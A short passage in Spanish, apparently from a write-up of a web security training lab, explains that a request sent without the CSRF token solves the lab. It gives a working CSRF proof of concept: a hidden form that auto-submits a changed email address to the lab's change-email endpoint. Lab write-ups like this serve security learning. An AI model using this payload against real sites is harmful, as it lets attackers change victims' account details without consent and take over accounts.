Entonces si hacemos un script que haga la petición sin llevar el token resolvemos el lab:

```
<form method="POST" action="https://0a1b00b6035997d383d60699004c0090.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
</form>
<script>
    document.forms[0].submit();
</script>
```
